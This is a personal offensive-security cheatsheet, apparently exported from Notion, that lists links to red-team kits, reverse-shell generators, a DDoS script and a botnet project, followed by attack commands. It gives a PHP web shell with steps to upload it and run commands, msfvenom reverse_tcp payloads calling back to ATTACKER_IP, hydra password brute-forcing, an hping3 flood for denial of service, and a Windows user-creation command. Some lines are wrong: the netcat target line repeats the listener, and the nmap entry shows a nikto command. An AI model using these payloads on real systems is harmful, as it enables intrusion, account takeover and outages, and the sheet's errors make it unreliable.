# CH4RR10t

Resources and cheatsheet collection

#Links

### 📌 RED TEAM TOOLKIT

[https://github.com/infosecn1nja](https://github.com/infosecn1nja)

[https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload Development](https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development)

### 📌 REVERSE SHELL CHEATSHEET

[https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### 📌 REVERSE SHELL GENERATOR

[https://www.revshells.com/](https://www.revshells.com/)

### 📌 FREE VULNERABLE MACHINES

[https://www.vulnhub.com/](https://www.vulnhub.com/)

### 📌 SAPHYRA DDOS TOOL

[https://github.com/IkzCx/ProgramsForDDos/blob/master/Saphyra.py](https://github.com/IkzCx/ProgramsForDDos/blob/master/Saphyra.py)

### 📌 BYOB -  Botnet [PC zombies]

[https://byob.dev/](https://byob.dev/)

### 📌 USEFUL PAGES

[https://www.hackxpert.com/labs](https://www.hackxpert.com/)



# cheatsheet

### 📌Find IP addresses of target

`$ host <SITE>
$ ping <SITE/IP>
$ nslookup <SITE>`

… for additional info(numbers, admin info, physical address, domain info, name servers, registrar info):

`$ whois <SITE>`

### 📌 IDENTIFY THE TYPE OF HASH

`$ hash-identifier`

### 📌 FTP Login (with credentials)

`$ ftp <IP>`

### 📌 GET LINUX PC INFO

`$ uname -a`

### 📌 START REVERSE SHELL (netcat)

attacker:

`$ nc -lnvp <PORT> -s <IP>`

target:

`$ nc -lnvp <PORT> -s <IP>`

### 📌 EXECUTE COMMANDS IN URL WITH PHP SHELL_EXEC

1. create file [anyname.php]

`$ <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

1. upload to server
2. execute commands by going to:

http://<IP>/anyname.php?cmd=<COMMAND>

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f4b3de9b-cd1e-42f0-b18b-6137415b15ee/Untitled.png)

### 📌 PORT::3389 OPEN (REMOTE SCREEN CONTROL)

framework: Crowbar

### 📌 TCP REVERSE SHELL EXPLOIT (Metasploit)

standard format:

`$ msfvenom -p <PAYLOAD_PATH> -f <FILE_EXTENSION> -o <FILE_NAME + EXTENSION> LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT>`

windows target:
`$ msfvenom -p windows/meterpreter/reverse_tcp -f <FILE_EXTENSION> -o <FILE_NAME + EXTENSION> LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT>`

android target:
`$ msfvenom -p android/meterpreter/reverse_tcp -o app.exe LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT>`

### 📌 GUESS/CRACK/BRUTEFORCE PSWD

framework: hydra

usage:

`$ hydra --l <NAME> -P <passlist.txt/WORDLIST_PATH> <IP>`

### 📌 SAMBA ENUMERATION

Get information from a Samba system (find usernames)

`$ enum4linux -a <IP>`

### 📌 GET DIECTORIES ON TARGET/WEBSITE

framework: dirb

`$ dirb <URL+http://>`

… with custom wordlist:

`$ dirb <URL+http://> <WORDLIST_PATH>`

framework: ffuf

`$ ffuf -c -w <WORDLIST_PATH> -u <http://+URL+/FUZZ>`

framework: gobuster

`$ gobuster dir -e -u <URL> -w <WORDLIST_PATH>`

### 📌 BRUTE-FORCE PASSWORD

FTP:

`$ hydra -l <USERNAME> -P <WORDLIST_PATH[rockyou]> ftp://<ip>`

### 📌 FTP login

`$ ftp <IP>`

### 📌 FIND HIDDEN FILES IN FILES

`$ binwalk <FILE_PATH>`

### 📌 EXTRACT DATA HIDDEN IN FILES

`$ steghide —extract -sf <FILE_PATH>`

### 📌 DOWNLOAD FILE FROM REMOTE [SSH/FTP]

`$ sudo scp <USERNAME>@<REMOTE_IP>:<FILE_PATH+ext> <LOCAL_PATH>`

eg `└─$ sudo scp [james@10.10.8.132](mailto:james@10.10.8.132):Alien_autospy.jpg ~/Desktop`

### 📌 EXTRACT HIDDEN FILES IN FILES

`$ binwalk <FILE_PATH> -e`

### 📌 UNLOCK ZIPPED FILES

`$ zip2john <ZIP_FILE_PATH> > output.txt`

### 📌 SCAN SPECIFIC FILE EXTENSION

framework: dirb

`$ dirb <IP/URL> -X <.FIlE_EXTENSION>`

### 📌 Getting target/site technologies & versions

framwork: whatweb

`$ whatweb -v <IP/SITE>`

### 📌 BASE64 DECODE

`$ base64 -d <<< <STRING>`

### 📌 RDP (Remote Desktop Protocol) [windows screen acsess]

[if you have password and username(try Administrator/admin)]

`$ freerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.106.116 /u:<USERNAME> /p:'<PSWD>'`

# SCAN FOR OUTDATED SERVICES, SERVER CONFIG, VERSION INFO, VULNERABILITIES

framework: Nikto

usage:

`$ nikto -h <URL/IP>`

scan specific port:

`$ nikto -h <URL/IP> -p <PORT>`

### 📌 START A WEB SERVER

`$ sudo python3 -m http.server 80`

### 📌 NMAP

basic usage:

`$ nikto -h <SITE/IP> -p <PORT>`

vulnerability scan:

`$ nmap --script vuln <IP>`

### 📌 GET FILE TYPE

`$ file <FILE_PATH>`

### 📌 FIND A FILE

`$ find / -type f -name <FILENAME+EXT>`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/869d9b68-cce4-4dc9-b146-07200eb6fe0e/Untitled.png)

### 📌 FOR A STABLE SHELL

`$ python -c ‘import pty;pty.spawn(“/bin/bash”)’`

`Ctrl+Z`

`$ stty raw -echo`

`$ fg`

`$ export TERM=xterm`

### 📌 DOS

`$ sudo hping3 -1 --flood <IP>` [-1 [icmp ping] defuault uses tcp. -S [syn attack] -d <NUMBER_OF_BYTES>]

Low Point Ion Cannon

### 📌 VIEW AND EDIT FILE HEX CONTENT

`$ hexeditor <FILE_PATH>`

### 📌 WINDOWS CREATE USER

`$ net user <USERNAME> <PSWD> /add`

### 📌 PORT INFORMATION

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b8c3363b-e3f3-451a-8f69-3387b23cdcbb/Untitled.png)
